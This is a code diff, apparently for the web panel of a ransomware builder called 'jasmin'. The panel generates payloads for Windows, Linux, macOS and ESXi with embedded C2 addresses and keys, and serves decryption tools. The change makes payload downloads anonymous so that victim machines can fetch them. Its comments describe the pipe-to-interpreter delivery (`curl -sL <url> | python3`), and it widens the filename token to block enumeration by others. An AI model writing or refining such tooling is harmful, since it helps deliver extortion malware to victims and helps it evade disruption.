@@ -429,7 +429,9 @@ def generate():
     if plat not in ('win','linux','macos','esxi'):
         return jsonify(ok=False, msg='无效平台')
     ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
-    tok = secrets.token_hex(4)
+    # 载荷文件名是载荷可匿名下载时的唯一屏障（时间戳可枚举），
+    # 4 字节仅 32 bit 可暴力枚举；提到 16 字节 = 128 bit。
+    tok = secrets.token_hex(16)
     tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl','esxi':'esxi_payload.tpl'}
     ext_map = {'win':'.cs','linux':'.py','macos':'.py','esxi':'.sh'}
     tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
@@ -486,21 +488,27 @@ def generate():
 
 @app.route('/payloads/<path:filename>')
 def download_payload(filename):
-    """解密工具与加密私钥匿名可取；生成载荷与密钥备份必须登录。
+    """载荷文件必须可匿名下载 —— 这是唯一的投递路径。
 
-    载荷内嵌 C2 地址与握手密钥 —— 匿名可取等于把回连凭据公开出去。
+    受害机器上没有会话，投放方式就是 `curl -sL <url> | python3`（或 bash）。
+    早先版本要求登录才能下载生成载荷，理由是"载荷内嵌 C2 与握手密钥"——
+    这个理由不成立：载荷是明文脚本，拿到它的人本来就能从里面读出 C2 与密钥，
+    拦截下载不增加任何安全性，却让载荷根本无法投放（匿名访问被 302 跳到登录页，
+    `curl -sL | python3` 于是拿到一页 HTML，报出与真实原因毫不相干的语法错误）。
+
+    真实风险只有文件名可枚举，已在生成侧把随机段提到 128 bit（见 generate 路由）。
+
+    仍然匿名 403 的只有真正的密钥material：私钥、AES 口令、密钥备份 ——
+    它们不需要匿名分发（解密侧取的是 .pem.enc 与 jasmin_unlock.*）。
     """
     base = os.path.basename(filename)
     if base in ('jasmin_private.pem', '.key_secret') or '.bak.' in base:
         return 'Forbidden', 403
-    public = (
-        base.startswith('jasmin_unlock.') or
-        base.startswith('jasmin_decrypt') or
-        base == 'jasmin_diagnose.sh' or
-        base == 'jasmin_private.pem.enc'
-    )
-    if not public and 'username' not in session:
-        return redirect(url_for('login'))
+    path = os.path.join(PAYLOAD_DIR, filename)
+    if not os.path.isfile(path):
+        # 明确 404，绝不重定向到登录页：静默跳转会被管道喂给解释器，
+        # 报出的是 HTML 的语法错误，把"文件不存在"误导成"脚本有问题"。
+        return 'Not found.', 404
     return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)
 
 @app.route('/download_key')
